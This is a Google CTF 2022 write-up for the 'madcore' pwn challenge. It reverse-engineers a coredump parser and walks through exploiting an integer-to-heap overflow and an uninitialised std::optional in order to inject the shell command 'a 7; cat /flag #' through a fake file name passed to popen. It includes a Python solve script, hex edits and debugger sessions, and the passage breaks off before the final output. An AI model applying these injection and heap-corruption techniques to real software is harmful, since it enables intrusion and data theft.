## introduction

`madcore` was a pwn task from [Google CTF 2022][googlectf]. It is a coredump helper
that parses the input as _coredump_ file and produces some results.
<!--more-->

### files

We are provided with few files:
+ `Dockerfile`
+ `flag`
+ `ld-linux-x86-64.so.2`
+ `libc.so.6`
+ `libstdc++.so.6`
+ `madcore`
+ `nsjail.cfg`

> download: [madcore.zip][madcore_zip]

### interface

`madcore` interface is simple. Just write bytes to it and it will count them until enough bytes is sent.

```bash
➜  madcore git:(main) ✗ ./madcore
abcd    # input bytes
Read 5  # counts bytes
```

so, I think it's time to prepare a _coredump_ file to send.

## coredump

### what is coredump file?

> A core dump is a file containing a process's address space (memory) when the process terminates unexpectedly. Core dumps may be produced on-demand (such as by a debugger), or automatically upon termination. Core dumps are triggered by the kernel in response to program crashes, and may be passed to a helper program (such as systemd-coredump) for further processing - [Arch Linux wiki](https://wiki.archlinux.org/title/Core_dump)

There is an interesting post covering _coredump_ file structure [here](https://www.gabriel.urdhr.fr/2015/05/29/core-file/).

### generate coredump file

I've tried to generate a _coredump_ file by simply causing `SEGFAULT` in my C++ program:

```bash
➜  crash git:(main) ✗ ls
test.cpp
➜  crash git:(main) ✗ ccat test.cpp       
0001: #include <iostream>
0002: using namespace std;
0003: int main(){
0004:    int arr[2];
0005:    arr[3] = 10;
0006:    return 0;
0007: }
0008: 
➜  crash git:(main) ✗ g++ test.cpp -o test
➜  crash git:(main) ✗ ls
test  test.cpp
➜  crash git:(main) ✗ ./test
*** stack smashing detected ***: terminated
[1]    13827 abort (core dumped)  ./test
➜  crash git:(main) ✗ ls
test  test.cpp
```

but no _coredump_ file is there...

There were two reasons why my _coredump_ file was not generated:
1. core dump size limit
2. core_pattern

```bash
➜  crash git:(main) ✗ sudo sysctl -w kernel.core_pattern=core.%u.%p.%t # to enable core generation
kernel.core_pattern = core.%u.%p.%t
➜  crash git:(main) ✗ ulimit -c unlimited # set core dump size to unlimited
➜  crash git:(main) ✗ ./test
*** stack smashing detected ***: terminated
[1]    14162 abort (core dumped)  ./test
➜  crash git:(main) ✗ ls    
core.1001.14162.1657865437  test  test.cpp
```

That way, I was able to generate valid _coredump_ file to provide it to `madcore`. The _coredump_ file generated that way is quite big and working on it was
probably not the best way as I didn't fully understand the layout of it. I spent too much time looking for correct bytes to edit...

### send coredump to madcore

At first, I was sending the _coredump_ file but the program wouldn't stop reading bytes...
I had to take a quick look at the decompiled code to see what is going on.
The reading is performed in `main()` function, just at the beginning.

```cpp
buffer = (uchar *)malloc(0x1000000);
memset(buffer,0,size);
temp_buffer = buffer;
length = 0;
while (size != 0) {
  _length = read(0,temp_buffer,size);
  length = (int)_length;
  if (length < 1) break;
  size = size - (long)length;
  temp_buffer = temp_buffer + length;
  printf("Read %d\n",length);
}
```

So, I have to send exactly `0x1000000` bytes. I prepared simple python script to do that easily.

```python
size = 0x1000000

with open(args.CORE, "rb") as coredump:
    data = bytearray(coredump.read())

data_len = len(data)
assert data_len < size
log.info(f"len: {data_len}")
io.send(data)
io.send(b"\x00"*(size-data_len))
io.recvuntil(b"FINISHED READING.\n", drop=True)
io.interactive()
```

And here is the result:

```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437
[*] len: 507904
[*] Switching to interactive mode
{"backtrace":[[0,"<unknown>"],[2137,"??\n??:0:0\n\n"],[438894,"??\n??:0:0\n\n"],[438366,"??\n??:0:0\n\n"],[438540,"??\n??:0:0\n\n"],[438366,"??\n??:0:0\n\n"],[153840,"0x328\n"]],"modules":["/home/[REDACTED]/crash","/usr/lib/x86_64-linux-gnu/ld-2.31.so","/usr/lib/x86_64-linux-gnu/libc-2.31.so"]}
[*] Got EOF while reading in interactive
$  
```

We can interact with the program, let's see what is happening inside!

## reverse engineering

### functions

#### main()

The object `Corefile` is initialized with buffer just after the reading it. Then, the `Corefile::Process()` and `Corefile::GetRegisters()`
functions are called.

```cpp
Corefile corefile = Corefile::Corefile(buffer, (long)temp_buffer - (long)buffer);
corefile.Process();
corefile.GetRegisters();
```

#### Corefile::Corefile()

The `Corefile::Corefile()` constructor initializes:
+ `ELFBinary` object for buffer
+ `std::vector` for `Binary` pointers
+ `std::vector` for `RegisterSet` pointers
+ `ELFBinary` object for all ELF files that is finds in the buffer
+ `std::map<unsigned long, ELFBinary*>` - address of the `ELFBinary` in the buffer and address of the object

#### Corefile::Process()

The `Corefile::Process()` function:
+ iterates over all `ELFBinary` objects
+ runs `Corefile::ProcessLOADs()` function

#### Corefile::ProcessLOADs()

The `Corefile::ProcessLOADs()` function iterates over process headers and initializes `Binary` objects.

#### Corefile::GetRegisters()

The `Corefile::GetRegisters()` function iterates over all `process_headers` and runs `Corefile::ProcessNotes()` for specific headers

#### Corefile::ProcessNotes()

The `Corefile::ProcessNotes()` function iterates over the process memory and looks for process notes.
Depending on the note type it runs different parser functions to handle them, including:
+ `Corefile::ProcessSIGINFO()`
+ `Corefile::ParseNtFile()`
+ `Corefile::ParseAUXV()`
+ add `X86RegisterSet` to list of register sets of an object

#### Corefile::ParseNtFile()

```cpp
void __thiscall Corefile::ParseNtFile(Corefile *this,elf64_note *note) {
  /* variables */
  
  puVar2 = (note + (*note + 3U & 0xfffffffc) + 0xc);
  uVar1 = *(note + 4);
  size = *puVar2;
  buffer = malloc(size << 3);
  index = 0;
  local_20 = puVar2 + 2;
  while( true ) {
    if (size <= (ulong)(long)index) {
      local_18 = ((ulong)uVar1 - 0x10) + size * -0x18;
      local_10 = puVar2 + 2 + size * 3;
      for (i = 0; (ulong)(long)i < size; i = i + 1) {
        __s = strndup((char *)local_10,local_18);
        sLength = strlen(__s);
        local_10 = (ulong *)((long)local_10 + sLength + 1);
        local_18 = (local_18 - sLength) - 1;
        binary = (Binary *)GetBinaryContainingAddress(this,*(ulong *)((long)buffer + (long)i * 8));
        if (binary != (Binary *)0x0) {
          Binary::SetFileName(binary,__s);
        }
      }
      return;
    }
    if ((ulong *)((long)puVar2 + ((ulong)uVar1 + 3 & 0xfffffffffffffffc)) <= local_20 + 3) break;
    *(ulong *)((long)index * 8 + (long)buffer) = *local_20;
    local_20 = local_20 + 3;
    index = index + 1;
  }
  return;
}
```

#### main() continued

Here, the initialization is done. After that, the program gets into loop that iterates over all threads:

```cpp
while (threads = corefile.GetNumberOfThreads(), thread_num < threads) {
  backtrace = corefile.GetBacktrace(thread_num);
  registerSet = corefile.GetMappedRegisterSet(thread_num);
  frameCount = backtrace.GetFrameCount();
  endFrameCount = frameCount;
  for (currFrameIdx = 0; currFrameIdx < endFrameCount; currFrameIdx = currFrameIdx + 1) {
    callFrame.field0_0x0 = backtrace->frames[currFrameIdx].field0_0x0;
    callFrame.field1_0x8 = backtrace->frames[currFrameIdx].field1_0x8;
    callFrame.binary = backtrace->frames[currFrameIdx].binary;
    threads = callFrame.GetSP();
    binary = (Binary *)callFrame.GetBinary();
    Symbolizer::Symbolizer(local_298,binary,threads);
    Symbolizer::Symbolicate[abi:cxx11]();
    mappedAddr = callFrame.GetMappedAddress();
    /*
     * push a result with address to std::vector, pseudocode:
     */
     new_pair = std::make_pair<ulong, string>(mappedAddr, str);
     std::vector::push_back(new_pair);
  }
  thread_num = thread_num + 1;
}
```

#### Corefile::GetBacktrace()

The `Corefile::GetBacktrace()` function:
+ initializes `StackWalker` object
+ runs `StackWalker::GetBacktrace()` function
+ runs `Backtrace::GetFrameCount()` function and logs the `frameCount`


#### StackWalker::GetBacktrace()

```cpp
Backtrace * __thiscall StackWalker::GetBacktrace(StackWalker *this, ulong address) {
  /* variables */
  
  backtrace = (Backtrace *)operator.new(0xc0);
  Backtrace::Backtrace(backtrace, address);
  binaryWithAddr = (Binary *)this->corefile.GetBinaryContainingAddress(address);
  tempAddr = address;
  if (binaryWithAddr != (Binary *)0x0) {
    while (isContain = (bool)binaryWithAddr.ContainsVirtualAddress(tempAddr), isContain == true) {
      vAddr = Binary::GetVirtualAddress(binaryWithAddr);
      coreAddr = binaryWithAddr.GetCore();
      addrInCore = *(coreAddr + (tempAddr - vAddr & 0xfffffffffffffff8));
      binaryWithNewAddr = this->corefile.GetBinaryContainingAddress(addrInCore);
      if ((binaryWithNewAddr != (Binary *)0x0) && binaryWithNewAddr.IsExecutable() == true)) {
        backtrace.PushModule(binaryWithNewAddr, addrInCore, tempAddr - address);
      }
      tempAddr = tempAddr + 8;
    }
  }
  return backtrace;
}
```

#### Binary::IsExecutable()

```cpp
bool __thiscall Binary::IsExecutable(Binary *this) {
  return (this->memoryProtections & 1) != 0;
}
```

#### Backtrace::Backtrace()

```cpp
void __thiscall Backtrace::Backtrace(Backtrace *this, ulong address) {
  /* variables */
  
  this->address = address;
  std::optional<unsigned_int>::optional();
  tmpThis = (CallFrame *)this;
  for (offset = 6; tmpThis = (CallFrame *)(tmpThis + 0x18), -1 < offset; offset = offset + -1) {
    CallFrame::CallFrame(tmpThis);
  }
  memset(this->frames, 0, 0xa8);
  return;
}
```

#### Backtrace::PushModule()

```cpp
void __thiscall Backtrace::PushModule(Backtrace *this, Binary *binary, ulong addrInCore, ulong offset) {
  /* variables */
  
  hasValue = this->frameCount.has_value();
  if (hasValue != true) {
    initValue = 1;
    this->frameCount = initValue;
  }
  maxValue = 6;
  if (this->frameCount <= maxValue) {
    frameCount = this->frameCount.value();
    newFrameCount = frameCount + 1;
    this->frameCount = newFrameCount;
    vAddr = binary.GetVirtualAddress();
    currFrame = CallFrame::CallFrame(offset, addrInCore - vAddr, binary);
    frameCount = *this->frameCount;
    frameIdx = frameCount - 1;
    this->frames[frameIdx].field0_0x0 = currFrame.field0_0x0;
    this->frames[frameIdx].field1_0x8 = currFrame.field1_0x8;
    this->frames[frameIdx].binary = currFrame.binary;
  }
  return;
}
```

#### Backtrace::GetFrameCount()

```cpp
uint __thiscall Backtrace::GetFrameCount(Backtrace *this) {
  uint *frameCountPtr;
  
  frameCountPtr = *this->frameCount;
  return *frameCountPtr;
}
```

#### Symbolizer::Symbolicate()

This is probably the most juicy part of the code because of that part:

```cpp
length = snprintf((char *)0x0, 0, "%s --obj=%s %p", "llvm-symbolizer", binaryName, offset);
commandBuf = (char *)malloc((long)(length + 1));
binaryName = binary.GetFileName();
snprintf(commandBuf, length + 1, "%s --obj=%s %p", "llvm-symbolizer", binaryName, offset);
popen(commandBuf, "r");
```

The function inserts the binary name to the command and executes it. We will win if we make `Binary::GetFileName()` return something like this:
`a 0x1; cat /flag #` because the executed command will look like this:
```bash
$ llvm-symbolizer --obj=a 0x1; cat /flag # $offset
```

and the program is later returning to us the output of the function, so flag would be there!

> It is indeed possible to simply overwrite the filename in the _coredump_ file but this is unintended solution, so no fun.
> In order to proceed with the writeup we have to assume the program is validating the filename when parsing _coredump_ file
> for example by checking if the file exists.

## vulnerabilities

### Corefile::ParseNtFile()

The `Corefile::ParseNtFile()` function calls `malloc(size << 3)` **where `size` is taken directly from _coredump_ file.**
The means we are able to cause `Integer Overflow` here.

```cpp
#include <utility>
#include <string>
#include <vector>
#include <iostream>
#include <optional>


using namespace std;


int main (int argc, char *argv[]) {
    ulong test = 0x2000000000000000;
    printf("0x%lx vs 0x%lx\n", test, test<<3);
    return 0;
}
```
```bash
➜  tests git:(main) ✗ g++ int_overflow.cpp -std=c++17 -o int_overflow
➜  tests git:(main) ✗ ./int_overflow
0x2000000000000000 vs 0x0
```

considering the fact that allocated chunk is later used to copy data from _coredump_ file into it and the size is used to determine
how much data to copy - we have `Heap Overflow` here with ability to overwrite memory with whatever we want (buffer is under our control).

### Backtrace::GetFrameCount()

The function is not vulnerable by it's own. It is the design which can cause vulnerabilities wherever this function is used.
`Backtrace::frameCount` is of type `std::optional<unsigned int>` which means that the value can be uninitialized in some cases.
However, the function `Backtrace::GetFrameCount()` doesn't check whether `std::optional::has_value()`.
In that case, the caller would be responsible for checking if the value is initialized.

The `frameCount` is fetched in three places:
1. `Backtrace::PushModule()`
```cpp
hasValue = this->frameCount.has_value();
if (hasValue != true) {
  initValue = 1;
  this->frameCount = initValue;
}
```
the function correctly checks if the `frameCount` is initialized with a value. Otherwise, it initializes the `frameCount` with 1.
2. `Corefile::GetBacktrace()`
```cpp
frameCount = Backtrace::GetFrameCount(backtrace);
clog(frameCount);
```
the function doesn't check if the `frameCount` is initialized, nothing interesting as it just logs the value.
3. `main()`
```cpp
frameCount = backtrace.GetFrameCount();
endFrameCount = frameCount;
for (currFrameIdx = 0; currFrameIdx < endFrameCount; currFrameIdx = currFrameIdx + 1) {
  callFrame.field0_0x0 = backtrace->frames[currFrameIdx].field0_0x0;
  callFrame.field1_0x8 = backtrace->frames[currFrameIdx].field1_0x8;
  callFrame.binary = backtrace->frames[currFrameIdx].binary;
  threads = callFrame.GetSP();
  binary = (Binary *)callFrame.GetBinary();
  Symbolizer::Symbolizer(local_298,binary,threads);
  Symbolizer::Symbolicate[abi:cxx11]();
```
the function doesn't check if the `frameCount` is initialized and gets into a loop where **number of iterations is equal to `frameCount`.**
The `for` loop iterates over `Backtrace::frames` list of `CallFrame` structures.
It then gets the binary address for `CallFrame` structure and passes it to `Symbolizer`.

Ther is only one puzzle missing. How the initialization of `frameCount` is performed:

### Backtrace::Backtrace()

```cpp
void __thiscall Backtrace::Backtrace(Backtrace *this, ulong address) {
  /* variables */
  
  this->address = address;
  std::optional<unsigned_int>::optional(std::nullopt_t);

  /* not important code */
}
```

if basically calls a `std::optional<unsigned_int>` constructor with `std::nullopt_t` without setting the value.
I decided to manually overwrite the memory before initialization of `std::optional` and check what value will `Backtrace::GetFrameCount()` return in main.

1. Set the breakpoint to `Backtrace::Backtrace()` constructor
```bash
pwndbg> b Backtrace::Backtrace(unsigned long) 
Breakpoint 5 at 0x71f8 (2 locations)
```
2. Overwrite the memory
```bash
pwndbg> p/x $rdi # get address of Backtrace object
$1 = 0x562592378e00
pwndbg> set {long}(0x562592378e00+0x10)=0xdeadbeefcafebabe # overwrite the memory
```
3. Compare memory before and after calling constructor
```python
# step until std::optional constructor is called
pwndbg> x/10xg 0x562592378df0
0x562592378df0:	0x000000006f732e31	0x00000000000000d1 # beginning of Backtrace object
0x562592378e00:	0x00007ffc0b3e1d90	0x0000000000000000
0x562592378e10:	0xdeadbeefcafebabe	0x0000000000000000 # overwritten memory
# step out of the constructor
pwndbg> x/10xg 0x562592378df0
0x562592378df0:	0x000000006f732e31	0x00000000000000d1 # beginning of Backtrace object
0x562592378e00:	0x00007ffc0b3e1d90	0x0000000000000000
0x562592378e10:	0xdeadbe00cafebabe	0x0000000000000000 # overwritten memory
0x562592378e20:	0x0000000000000000	0x0000000000000000
0x562592378e30:	0x0000000000000000	0x0000000000000000
```

The bytes at offset 4 was set to `0x00` and nothing more. This is the byte used to determine if the `std::optional` object has a value.

## exploitation

### analysis summary

1. We want to trick the program into executing command with malicious filename but we are not able to simply pass it from _coredump_ file
2. We have heap overflow in `Corefile::ParseNtFile()`
3. The `Backtrace::GetFrameCount()` can return uninitialized value and the loop in main relies on the value
4. The `Backtrace::PushModule()` function initializes the value of `frameCount`

### idea

1. Abuse the heap overflow in order to overwrite the memory that will later be used for `std::optional`.
2. Initialize the `Backtrace` object
3. Avoid calling `Backtrace::PushModule()` from `StackWalker::GetBacktrace()`

If we manage to execute those steps we will have control over the `frameCount`. It is important to remember where it is used:
```cpp
frameCount = backtrace.GetFrameCount();
endFrameCount = frameCount;
for (currFrameIdx = 0; currFrameIdx < endFrameCount; currFrameIdx = currFrameIdx + 1) {
  callFrame.field0_0x0 = backtrace->frames[currFrameIdx].field0_0x0;
  callFrame.field1_0x8 = backtrace->frames[currFrameIdx].field1_0x8;
  callFrame.binary = backtrace->frames[currFrameIdx].binary;
  threads = callFrame.GetSP();
  binary = (Binary *)callFrame.GetBinary();
  Symbolizer::Symbolizer(local_298,binary,threads);
  Symbolizer::Symbolicate[abi:cxx11]();
```

```cpp
class Binary {
  uint64_t core;
  uint64_t size;
  char[64] fileName;
  uint64_t virtualAddress;
  uint64_t memoryProtections;
};

class CallFrame {
  uint64_t field0;
  uint64_t field1;
  Binary* binaryAddr;
};

class Backtrace {
  uint64_t address;
  uint64_t field1;
  std::optional<unsigned_int> frameCount;
  CallFrame[6] callFrame;
};
```

If `frameCount` will return value bigger than 6 we would have OOB read. We could abuse that to trick program into reading our fake `CallFrame` object
that would have set `binaryAddr` to fake `Binary` object with malicious filename.

### implementation

It's time to implement steps from idea in order to successfully exploit the vulnerabilities.

#### Heap overflow

```python
0x5647a04a5620:	0x0000000000000000	0x0000000000000101 ===> allocated buffer
0x5647a04a5630:	0x000055cf2f7b8000	0x000055cf2f7b9000
0x5647a04a5640:	0x000055cf2f7ba000	0x000055cf2f7bb000
0x5647a04a5650:	0x000055cf2f7bc000	0x00007efca3592000
0x5647a04a5660:	0x00007efca3595000	0x00007efca35a7000
0x5647a04a5670:	0x00007efca35ab000	0x00007efca35ac000
0x5647a04a5680:	0x00007efca35ad000	0x00007efca35ba000
0x5647a04a5690:	0x00007efca3661000	0x00007efca36fa000
0x5647a04a56a0:	0x00007efca36fb000	0x00007efca36fc000
0x5647a04a56b0:	0x00007efca371e000	0x00007efca3896000
0x5647a04a56c0:	0x00007efca38e4000	0x00007efca38e8000
0x5647a04a56d0:	0x00007efca38ee000	0x00007efca3984000
0x5647a04a56e0:	0x00007efca3a75000	0x00007efca3abe000
0x5647a04a56f0:	0x00007efca3abf000	0x00007efca3aca000
0x5647a04a5700:	0x00007efca3af4000	0x00007efca3af5000
0x5647a04a5710:	0x00007efca3b18000	0x00007efca3b21000
0x5647a04a5720:	0x00007efca3b22000	0x0000000000000051 ===> binary filename
0x5647a04a5730:	0x44442f656d6f682f	0x4444444444444444
0x5647a04a5740:	0x4444444444444444	0x4444444444444444
0x5647a04a5750:	0x4444444444444444	0x4444444444444444
0x5647a04a5760:	0x4444444444444444	0x68736172632f4444
.
.
.
0x5647a04a5dc0:	0x000000006f732e31	0x0000000000000031 ===> binary filename
0x5647a04a5dd0:	0x62696c2f7273752f	0x2d34365f3638782f
0x5647a04a5de0:	0x6e672d78756e696c	0x332e322d646c2f75
0x5647a04a5df0:	0x000000006f732e31	0x00000000000000d1 ===> Backtrace object
0x5647a04a5e00:	0x00007ffc0b3e1d90	0x0000000000000000
                         ================================ std::optional<unsigned_int> initialized = 0x01 and value = 0x07
                        \/
0x5647a04a5e10:	0xafaa1a0100000007	0x0000000000000000
0x5647a04a5e20:	0x0000000000000000	0x0000000000000000
0x5647a04a5e30:	0x0000000000000118	0x0000000000000859
0x5647a04a5e40:	0x00005647a04a49a0	0x0000000000000248
0x5647a04a5e50:	0x000000000006b26e	0x00005647a04a49a0
0x5647a04a5e60:	0x00000000000002a8	0x000000000006b05e
0x5647a04a5e70:	0x00005647a04a49a0	0x00000000000002c8
0x5647a04a5e80:	0x000000000006b10c	0x00005647a04a49a0
0x5647a04a5e90:	0x00000000000002e8	0x000000000006b05e
0x5647a04a5ea0:	0x00005647a04a49a0	0x0000000000000328
0x5647a04a5eb0:	0x00000000000258f0	0x00005647a04a4c40
0x5647a04a5ec0:	0x0000000000000000	0x000000000000c141 ===> top chunk
```

the layout:
+ our allocated chunk
+ all binary filenames from `Corefile::ParseNtFile()`
+ Backtrace object we want to overwrite

however, the layout will be different if we pass huge size as this is the condition that has to be fulfilled in order to allocate all filename chunks:
```cpp
if (size <= index)
```
so, if size will be huge, the `Backtrace` chunk will land just after the allocated chunk. We just have to make sure the top chunk size bytes won't change because
otherwise next `malloc()` call will crash. As I am not really familiar with _coredump_ file structure, I added breakpoint in `Corefile::ParseNtFile()` function
and looked for offset where the `elf64_note` lies.
+ the `RSI` register contained address that is placed at offset `0xd68` of _coredump_ file buffer.
+ `malloc()` was invoked with value `0xf8` so the initial size is: `0xf8 >> 3 = 0x1f`

I opened the _coredump_ file in `nvim` using command: `$ nvim -b core` and `:%!xxd` inside `nvim` to edit it in more human-friendly format.

It was quite easy to find the correct offset:

```python
00000d60: 0000 0000 0000 0000 0500 0000 7108 0000  ............q...
                                         ============== size
                                        \/
00000d70: 454c 4946 434f 5245 0000 0000 1f00 0000  ELIFCORE........
00000d80: 0000 0000 0010 0000 0000 0000 0080 7b2f  ..............{/
```

and replace the value with `0x2000000000000020`.
To save the file in `nvim` we have to execute `:%!xxd -r` and `:w` to write the file.

```python
00000d60: 0000 0000 0000 0000 0500 0000 7108 0000  ............q...
                                        ===============================\
                                        \___ ____                       \ size
00000d70: 454c 4946 434f 5245 0000 0000 2000 0000  ELIFCORE.... ...     / 0x2000000000000020
                   ====================================================/ 
          ____ ___/
00000d80: 0000 0020 0010 0000 0000 0000 0080 7b2f  ... ..........{/
```

and after running the program with a changed size:

```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437 
[*] len: 507904
[*] Switching to interactive mode
malloc(): corrupted top size
[*] Got EOF while reading in interactive
```

Last step here will be finding offset of the data that overwrites the top chunk size and replace it with value `0xc8d1`
(the size after `malloc()` is invoked in the `Corefile::ParseNtFile()`).
I found it simply by:
1. find address of top chunk after `malloc()` call in `Corefile::ParseNtFile()`
2. check the value of that address after `Corefile::ParseNtFile()` function returns
3. find first occurence of that value in _coredump_ file

probably this is not 100% working solution, but worked for me. The value will be after offset (`0xd68`) at which the size was located.

And this is the result:

```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437    
[*] len: 507904
[*] Switching to interactive mode
{"backtrace":[[0,"<unknown>"],[2137,"0x118\n"],[438894,"0x248\n"],[438366,"0x2a8\n"],[438540,"0x2c8\n"],[438366,"0x2e8\n"],[153840,"0x328\n"]],"modules":[]}
[*] Got EOF while reading in interactive
```

Let's check the value of `frameCount` before running `Backtrace::PushModule()`:

1. set breakpoint to `Backtrace::PushModule()`
2. Get the address from `RDI` register (address of `Backtrace` object)
3. print the value of `frameCount`:
```bash
pwndbg> x/xw $rdi+0x10      # value
0x5626f73fc750:	0x742f6572
pwndbg> x/xb $rdi+0x10+0x4  # has_value
0x5626f73fc754:	0x00
```

#### Backtrace initialization

This step is easy as the `Backtrace` is initialized unconditionally.

#### Avoid Backtrace::PushModule()

In order to avoid calling `Backtrace::PushModule()` we need to analyze the code that runs it:
```cpp
if ((binaryWithNewAddr != (Binary *)0x0) && binaryWithNewAddr.IsExecutable() == true)) {
  backtrace.PushModule(binaryWithNewAddr, addrInCore, tempAddr - address);
}
```
We have to change memory protections of all binaries in _coredump_ file to have lowest bit set to `0` and the condition will never be `true`.
It was really easy to do in `nvim`, just:
1. open it in binary mode: `$ nvim -b core`
2. use `:%!xxd` to move to human-friendly format
3. select the memory at the beginning that contains all `elf64_phdr` entries
4. replace all `0500 ` characters with `0400 `: `:'<,'>s/0500 /0400 /g`

and here is the result:

```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437    
[*] len: 507904
[*] Switching to interactive mode
LLVMSymbolizer: error reading file: No such file or directory
[*] Got EOF while reading in interactive
```

#### fake objects

##### debugging 

Let's check with `gdb` what is going on inside

1. Set breakpoint at `Backtrace::GetFrameCount()` to check the returned value:
`Backtrace::GetFrameCount()` returns `0x742f6572` value - **success**
2. Set breakpoint to `Binary::GetFileName()` to check which `CallFrame` makes it to `Symbolizer::Symbolicate()`

##### preparing memory layout

It turns out that the `Backtrace::frames` array is empty and the first non-empty element that is treated as `CallFrame` element is inside
`MappedRegisterSet` object allocated just after the `Backtrace` object.
Lucky for us, we have almost full control over the content of that class. We cannot change the first qword of that class as this is `vpointer`.
However, we can change every next byte of that class.

register values are stored at offset `0x70` and I think that data between `vpointer` and `registers` is either unused or just copies the memory from _coredump_ file.

```cpp
X86RegisterSet * __thiscall X86RegisterSet::GetRegisters(X86RegisterSet *this) {
  return this + 0x70;
}
```

Due to `popen()` call inside the program, it was hard to debug what happens after first `Symbolizer::Symbolicate()` run. Here, the _coredump_ files come to the rescue!

```bash
➜  writeup git:(main) ✗ ./solve.py CORE=crash/core.1001.14162.1657865437
[*] len: 507904
[*] Switching to interactive mode
LLVMSymbolizer: error reading file: No such file or directory
[*] Got EOF while reading in interactive
$ 
➜  writeup git:(main) ✗ ls | grep core
core.1001.182319.1658134823
madcore
➜  writeup git:(main) ✗ gdb -c core.1001.182319.1658134823 madcore
pwndbg> info registers
rax            0x57e               1406
rbx            0x73                115
rcx            0x1                 1
rdx            0x2d6362696c2f757e  3270565959327249790
rsi            0x7f41254479ab      139917774846379
rdi            0x2d6362696c2f757e  3270565959327249790
rbp            0x7ffcc8bd0040      0x7ffcc8bd0040
rsp            0x7ffcc8bcfad8      0x7ffcc8bcfad8
r8             0x7f412556f040      139917776056384
r9             0x7f412556f0c0      139917776056512
r10            0x7f412556efc0      139917776056256
r11            0x0                 0
r12            0x16                22
r13            0x2d6362696c2f757e  3270565959327249790
r14            0x0                 0
r15            0x7ffcc8bd01c0      140723676316096
rip            0x7f412553cd99      0x7f412553cd99
eflags         0x10283             [ CF SF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
pwndbg> x/10i $pc
=> 0x7f412553cd99:	vpcmpeqb ymm1,ymm0,YMMWORD PTR [rdi]
   0x7f412553cd9d:	vpmovmskb eax,ymm1
   0x7f412553cda1:	test   eax,eax
   0x7f412553cda3:	je     0x7f412553ce00
   0x7f412553cda5:	tzcnt  eax,eax
   0x7f412553cda9:	vzeroupper 
   0x7f412553cdac:	ret    
   0x7f412553cdad:	nop    DWORD PTR [rax]
   0x7f412553cdb0:	tzcnt  eax,eax
   0x7f412553cdb4:	sub    edi,edx
```

The failing instruction is inside `sprintf()` call.
It comes out the value under `RDI` register is the value from next fake `CallFrame` after `vpointer` plus `0x10` (offset at which the `Binary::fileName` should be).

**Conclusion:** Memory layout we want to prepare needs to contain only valid addresses at offsets representing `CallFrame::binaryAddr` - **but... how to do that without leaks?**
Here, the functionality of `madcore` comes to the rescue:

```cpp
if (binaryPtr != (Binary *)0x0) {
  mappedRegisterSet.GetRAX();
  core = binaryPtr->GetCore();
  raxPtr = mappedRegisterSet.GetRAX();
  rax = *raxPtr;
  vaddr = binaryPtr->GetVirtualAddress();
  mappedRegisterSet.GetRAX();
  *raxPtr = core + (rax - vaddr);
  mappedRegisterSet.GetRAX();
  vaddr = binaryPtr->GetVirtualAddress();
}
```

this code basically translates address from _coredump_ to address of chunk allocated for _coredump_ buffer during `madcore` program execution, meaning that the program will
make the address valid for us. This is what we have to do now:
1. Clean the memory to have `0x00` at offsets corresponding to `CallFrame::binaryAddr`
The code that can help with finding them is:
```cpp
*(index * 8 + buffer) = *memoryPtr;
memoryPtr = memoryPtr + 3; // here it's memoryPtr + 0x18 but memoryPtr is of type ulong*
index = index + 1;
```
because the offset between next values to zero-out is `0x18 * 0x3 = 0x48`
2. Find register which is placed at the correct offset and set it's value to valid address from _coredump_ perspective that will be then translated to valid address.
In my case it was `R14` which was at offset `0x8` (so `registers[1]`). It was pointing at offset `0x40000`:

```python
0x55c516ae1800:	0x696c2f756e672d78	0x0000000000000121 ===> MappedRegisterSet
0x55c516ae1810:	0x000055c516073ac8	0x00007fe9b008f994
0x55c516ae1820:	0x0000000000000150	0x0000000000000000
0x55c516ae1830:	0x2d34365f3638782f	0x2f006f732e31332e
0x55c516ae1840:	0x0000000000000000	0x782f62696c2f7273
0x55c516ae1850:	0x332e322d6362696c	0x0000000000000000
0x55c516ae1860:	0x7273752f006f732e	0x696c2f756e672d78
0x55c516ae1870:	0x0000000000000000	0x7362696c2f756e67
0x55c516ae1880:	0x0000000000000001	0x00007fe9b00cf010 ===> registers[0] registers[1] <=== R14 with valid address
0x55c516ae1890:	0x0000000000000020	0x00007fe9b00f2020
0x55c516ae18a0:	0x00007fe9b00f2120	0x00007fe9b00b7f50
0x55c516ae18b0:	0x0000000000000146	0x0000000000000008
0x55c516ae18c0:	0x00007fe9b00f1da0	0x0000000000000000
0x55c516ae18d0:	0x0000000000000000	0x00007fe9b00e101b
0x55c516ae18e0:	0x0000000000000000	0x00007fe9b00f1da0
0x55c516ae18f0:	0x0000000000000002	0x000000000000000e
0x55c516ae1900:	0x00007efca373f00b	0x0000000000000033
0x55c516ae1910:	0x0000000000000246	0x00007fe9b00f1da0
0x55c516ae1920:	0x000000000000002b	0x0000000000000031
pwndbg> vmmap 0x00007fe9b00cf010
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7fe9b008f000     0x7fe9b1094000 rw-p  1005000 0      [anon_7fe9b008f] +0x40010 <=== offset is reduced by 0x10 == 0x40000
```

3. Overwrite the memory at offset+0x10 to the malicious `Binary::fileName`

```python
00040000: 902b aca3 fc7e 0000 b0c4 9ba3 fc7e 0000  .+...~.......~..
00040010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00040020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00040030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00040040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
```

4. Replace `A` characters with malicious command in `solve.py`

```python
to_replace = b"A"*64
lngth = len(to_replace)
payload =  b"a 7; cat /flag #"
payload = payload.ljust(lngth, b"a")
data = data.replace(to_replace, payload)
```

5. Fix last bug:
As the `frameCount` is huge, the loop executing `Symbolizer::Symbolicate()` won't stop after our fake `CallFrame` but will go further. This will end with `SEGFAULT`
or other errors and as a result the JSON with outputs won't be printed and we won't see the output of command. In order to fix that I specified the `frameCount` value
that will cause the loop to finish just after fake `CallFrame`. This is fairly easy, as we know the current value (`0x742f6572`) and we know it is `0x18 * 0x3 = 0x48`
after the top chunk size we already written into our _coredump_ file.
The value `frameCount == 0xd` returned following result:

```bash
